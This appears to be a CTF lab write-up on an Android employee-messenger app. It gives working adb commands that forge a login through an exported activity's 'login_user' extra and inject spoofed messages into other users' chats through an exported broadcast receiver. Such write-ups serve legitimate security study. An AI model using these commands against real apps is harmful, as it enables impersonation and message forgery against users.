# Findings

- `MessengerActivity` is exported in the manifest.
- It accepts a plain `login_user` extra.
- It sets `PrepareData.logged_in_user` from that extra without checking any real session token.
- Decrypted chat evidence explicitly mentions this exact weakness.
- Launching the activity with `adb shell am start ... --es login_user "Alexandros Charalampidis"` opens the messenger UI directly as that user.
- This is a login/session bypass, not a normal credential-based login.
- `ActionReceiver` is also exported in the manifest.
- `ActionReceiver` has real code for `com.blindsec.SEND_MESSAGE` and `com.blindsec.AUTH_SEND_MESSAGE`.
- `ActionReceiver` has no real branch for `com.blindsec.SEND_PROJECT`; that path is registered in `LoginActivity` but functionally inert.
- `AUTH_SEND_MESSAGE` can be triggered explicitly against the exported receiver from a cold start with legacy hardcoded credentials, omitted here.
- That cold-start receiver path successfully injects a new message into the in-app conversation dataset.
- After forging session state through exported `MessengerActivity`, an explicit `SEND_MESSAGE` broadcast can inject a visible message into another employee's chat.
- Unauthenticated `SEND_MESSAGE` alone does not mutate state from a cold start.
- No new `Mag1k`-specific literal `csc{...}` flag has been found in sources, resources, unpacked APK artifacts, decrypted messages, or the tested runtime paths.

## Proven commands

```bash
cd ~
adb shell 'am start -n com.blindsec.internalemployeemessenger/.MessengerActivity --es login_user "Alexandros Charalampidis"'
```

```bash
cd ~
adb shell 'am force-stop com.blindsec.internalemployeemessenger; am broadcast -n com.blindsec.internalemployeemessenger/.ActionReceiver -a com.blindsec.AUTH_SEND_MESSAGE --es TO "<recipient>" --es Message "coldstart_auth_probe" --es username "<redacted>" --es password "<redacted>"'
```

```bash
cd ~
adb shell 'am force-stop com.blindsec.internalemployeemessenger; am start -n com.blindsec.internalemployeemessenger/.MessengerActivity --es login_user "Alexandros Charalampidis"; sleep 2; am broadcast -n com.blindsec.internalemployeemessenger/.ActionReceiver -a com.blindsec.SEND_MESSAGE --es TO "Petros Papadopoulos" --es Message "explicit_send_probe" --es login_user "Alexandros Charalampidis"'
```

## Observed behavior
- the app opens directly into Messenger
- no password prompt is required
- chats are accessible as the forged user
- `coldstart_auth_probe` appears in Christos <-> Petros chat after only an explicit cold-start `AUTH_SEND_MESSAGE`
- `explicit_send_probe` appears in Alexandros <-> Petros chat after session forgery plus explicit `SEND_MESSAGE`
- `project_probe` does not appear after explicit `SEND_PROJECT`
- `unauth_probe` does not appear after unauthenticated explicit `SEND_MESSAGE`

## Best current conclusion
`Mag1k` is most likely a cross-app exploit challenge, not a hidden literal-flag challenge.

The strongest proven impact is:
`forged session through exported MessengerActivity + message injection through exported ActionReceiver`

## Ranked answer candidates
1. `Cross-app message injection via exported ActionReceiver after forged login_user session in exported MessengerActivity`
2. `Unauthorized internal message spoofing via exported ActionReceiver and forged MessengerActivity session`
3. `Employee impersonation and message injection through exported MessengerActivity and ActionReceiver`
